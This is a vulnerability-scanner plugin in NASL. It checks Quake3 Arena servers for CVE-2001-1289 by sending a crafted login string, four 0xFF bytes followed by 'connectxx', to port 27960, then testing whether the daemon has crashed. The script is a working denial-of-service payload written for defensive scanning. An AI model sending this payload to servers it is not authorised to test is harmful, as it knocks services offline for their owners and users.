if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10931" );
	script_version( "2019-04-24T07:26:10+0000" );
	script_tag( name: "last_modification", value: "2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3123 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2001-1289" );
	script_name( "Quake3 Arena 1.29 f/g DOS" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "This script is Copyright (C) 2001 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 27960 );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to crash the Quake3 Arena daemon by sending a specially
  crafted login string." );
	script_tag( name: "impact", value: "A cracker may use this attack to make this service crash continuously,
  preventing you from playing." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
port = 27960;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = NASLString( raw_string( 0xFF, 0xFF, 0xFF, 0xFF ), "connectxx" );
send( socket: soc, data: s );
close( soc );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port: port );
	exit( 0 );
}
close( soc );
exit( 99 );

